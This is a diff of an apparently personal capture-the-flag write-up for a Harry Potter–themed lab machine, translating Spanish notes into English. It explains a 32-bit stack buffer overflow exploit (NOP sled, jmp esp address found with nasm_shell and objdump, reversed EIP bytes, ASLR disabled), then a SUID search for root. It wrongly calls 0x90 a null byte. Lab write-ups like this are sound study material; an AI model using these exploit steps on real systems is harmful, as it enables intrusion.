@@ -2644,9 +2644,28 @@ add it in exploit.py
   22   │ before_eip = b"C"*100 # ESP
 
 ```
-before eip yo se que si pongo 100 c como lo hice, van a quedar en el ESP claro si tu lograras hacer que el eip  apuntara a una direccion la cual aplique un jump ESP para que apunte al ESP  el problema de este caso es que  cuando salte al ESP  puede generar un conflicto hay veces que  no llega a clavar justo al punto donde se encuentra el shellcode por tanto la idea seria jugar con nops para crear un espacio y en tal caso la instruccion como no es precisa caiga en un punto intermeedio de los nops para luego llegarlo a desplazar donde esta nuestro shellcode
 
-entonces lo que vamos a hacer es definir nops 
+
+before eip
+
+i know that if i input 100 c's just how i did, they will be input in the ESP, of course if you achives that the EIP aims to a direction, which allow us to apply a jump ESP to aim the ESP the, problem in our case is that when we try to jump to ESP we won't aim to the real direction, where the shellcode is storaged a mean imagine that you are hunting and you want to aim a target with folded eyes so you are blind, it would be difficult to aim and shoot the target, using an arch and arrow,using this example we will play with a higher target using nops
+
+what is nops ?
+
+```bash
+"Nops" refer to a sequence of null bytes that are used to create space on the stack where the shellcode will be stored. This is done so that when the EIP is overwritten and jumps to the ESP address, it can point to the beginning of these "nops" and have a space to write the shellcode without overwriting other important instructions on the stack.
+
+For example, if we use b"\x90" *32, we are creating a 32-byte space on the stack with the null byte sequence (90 in hexadecimal). This way, when the EIP points to the ESP, it will jump to the address where the "nops" are and then move to the shellcode.
+
+As for the stack displacement with "nasmShell," this refers to creating a shellcode that allows manipulation of the ESP position to make it point to the shellcode. This is done using assembly instructions that allow adjusting the position of the ESP so that it points to the shellcode.
+```
+the reason to play with nops is to aim a higher target, so being said that. using nops the idea would be to play with nops to create a bigger space and in such case the instruction as it is not precise falls into a
+intermediate point of the nops to then move it to where our shellcode is
+
+so what we are going to do is define nops
+
+```│ after_eip = b"\x90"*32 + shellcode # ESP```
+in the script will be
 
 ```bash 
  #/usr/bin/python3
@@ -2673,26 +2692,29 @@ entonces lo que vamos a hacer es definir nops
   22   │ after_eip = b"\x90"*32 + shellcode # ESP
 
 ```
-ahora como yo logro controlar el EIP tengo que buscar que el EIP apunte a una direccion donde se aplique un jump un salto al ESP para que asi a la hora de cargar esta instruccion vaya el flujo del programa al stack o sea al esp y como el esp es esto ```after_eip = b"\x90"*32 ``` para que no comience directamente con el shellcode que puede que entre en conflicto le damos un peque;o espacio  ```after_eip = b"\x90"*32 ``` para caer en un punto intermediario de los nops  y ya que esto nos mande al shellcode
+Now, since I have control over the EIP, I need to find an address to which I can apply a jump to the ESP. This way, when this instruction is loaded, the program's flow will go to the stack, or in other words, the ESP. As the ESP contains this after_eip = ```b"\x90"*32``` so that it doesn't start directly with the shellcode, which might cause conflicts, we give it a small space after_eip = b"\x90"*32 to fall into an intermediate point of the nops. Once this happens, we will be sent to the shellcode.
 
-ahora nuestro objetivo es buscar donde se aplique esta instruccion el jmp ESP 
-
-para buscarla usaremos una tool que se llama objdump + -D + binario + | + grep + opcode
+# JMP instrucction BOF
 
 
-y con metasploit usamos namshell para buscar un operation code y tomar este operation code y filtrarlo 
+now our objective is to find where this instruction apply it in the jmp ESP
+
+to find it we will play we a tool called objdump + -D + binario + | + grep + opcode
+
+
+and with metasploit we will use namshell to find an operation code and we have to take this operation code and filter it  
 
 
 ejm
 
 ```bash 
-busquemos el operation code del jmp con metasploit 
+
 ❯ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
 nasm > jmp ESP
 00000000  FFE4              jmp esp
 nasm > 
 ```
-el operation code seria ```ffe4``` cuando lo vayamos a grepear hay que poner minusculas 
+the operation code would be ```ffe4``` 
 
 ejm 
 ```bash 
@@ -2708,10 +2730,11 @@ ejm
 ```
 and this is the direction because of ```ff e4``` > ```8049d55``` this one right ```8049d55``` 
 
+if 
 
-si ahora yo lograra que el eip apuntara a esta direccion ```8049d55 ``` se deberia de aplicar un salto al esp 
+now if i made that the eip aim to this direction ```8049d55 ``` it will jump to ESP
 
-como estamos en 32 bits tenemos que jugar con la direccion al reves seria copiar la direccion ```8049d55``` y ponerla alrevez ejem 
+in this case we are working with a binary of 32 bits regarding this we have to play  with the reverse direction ejm ```8049d55``` 
 
 eip = ```bash"x55/x9d/x04/x08"``` # ```8049d55``` ->jmp ESP
 
@@ -2773,7 +2796,7 @@ before you run this app please make sure to change this
 cat proc/sys/kernel/randomize_va_space it has to day 0
 
 
-just run tt 
+just run it
 
 ❯ ./server_hogwarts
 
@@ -2934,6 +2957,8 @@ neville
 neville@Fawkes:~$ 
 
 ```
+## Privilage Escalation 192.168.100.130
+
 ```bash 
 neville@Fawkes:/$ find \-perm -4000  2>/dev/null
 ./usr/local/bin/sudo
@@ -2995,10 +3020,16 @@ Here is your last hocrux: horcrux_{ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvV
 
 # 
 
+```
+finding a new machines 
+
 ```bash
 # hostname -I
 192.168.100.130 172.17.0.1 
 # 
 ```
+and actually there's no more machines to jump 
+so that would be it 
+
 
 Happy hacking !
